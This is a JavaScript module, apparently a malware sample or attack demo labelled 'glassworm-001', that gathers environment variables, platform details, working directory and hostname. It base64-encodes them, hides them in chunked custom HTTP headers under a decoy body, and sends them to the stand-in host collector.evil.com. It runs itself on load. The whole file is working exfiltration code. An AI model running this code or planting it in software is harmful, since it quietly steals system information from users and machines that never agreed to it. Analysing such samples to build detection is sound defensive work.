/**
 * HTTP Header Exfiltration
 * Sends data via custom HTTP headers
 */

// Exfiltration endpoint
const EXFIL_ENDPOINT = 'https://collector.evil.com/api/data';

/**
 * Collect sensitive environment data
 * @returns {Object} - Collected data
 */
function collectData() {
    return {
        // Environment variables
        env: {
            NODE_ENV: process.env.NODE_ENV,
            HOME: process.env.HOME,
            USER: process.env.USER,
            PATH: process.env.PATH
        },
        
        // System info
        system: {
            platform: process.platform,
            arch: process.arch,
            nodeVersion: process.version,
            cwd: process.cwd()
        },
        
        // Network info (simulated)
        network: {
            hostname: require('os').hostname()
        },
        
        // Timestamp
        timestamp: Date.now()
    };
}

/**
 * Encode data for header transmission
 * @param {Object} data - Data to encode
 * @returns {string} - Base64 encoded string
 */
function encodeForHeader(data) {
    const json = JSON.stringify(data);
    return Buffer.from(json).toString('base64');
}

/**
 * Exfiltrate data via HTTP headers
 * Uses custom headers to hide data in transit
 * @param {Object} data - Data to exfiltrate
 */
async function exfiltrateViaHeaders(data) {
    const encoded = encodeForHeader(data);
    
    // Split into chunks for multiple headers
    const chunkSize = 500;
    const chunks = [];
    for (let i = 0; i < encoded.length; i += chunkSize) {
        chunks.push(encoded.slice(i, i + chunkSize));
    }
    
    // Build custom headers
    const headers = {
        'X-Exfil-ID': 'glassworm-001',
        'X-Session-Token': generateSessionToken(),
        'X-Data-Chunk-Count': chunks.length.toString(),
        'X-Timestamp': Date.now().toString()
    };
    
    // Add data chunks as headers
    chunks.forEach((chunk, index) => {
        headers[`X-Data-${index}`] = chunk;
    });
    
    console.log('Exfiltrating data via headers...');
    console.log('Endpoint:', EXFIL_ENDPOINT);
    console.log('Data size:', encoded.length, 'bytes');
    console.log('Chunks:', chunks.length);
    
    try {
        const response = await fetch(EXFIL_ENDPOINT, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify({ status: 'ok' }) // Decoy body
        });
        
        console.log('Exfiltration complete, status:', response.status);
        return response.ok;
    } catch (error) {
        console.error('Exfiltration failed:', error.message);
        return false;
    }
}

/**
 * Generate session token for tracking
 * @returns {string} - Session token
 */
function generateSessionToken() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let token = '';
    for (let i = 0; i < 32; i++) {
        token += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return token;
}

/**
 * Start exfiltration process
 */
async function startExfiltration() {
    console.log('=== HTTP Header Exfiltration ===');
    
    const data = collectData();
    console.log('Collected data:', Object.keys(data).join(', '));
    
    const success = await exfiltrateViaHeaders(data);
    
    if (success) {
        console.log('Exfiltration successful');
    } else {
        console.log('Exfiltration failed, will retry...');
    }
    
    return success;
}

// Export functions
module.exports = {
    collectData,
    encodeForHeader,
    exfiltrateViaHeaders,
    generateSessionToken,
    startExfiltration,
    EXFIL_ENDPOINT
};

// Auto-execute
startExfiltration();
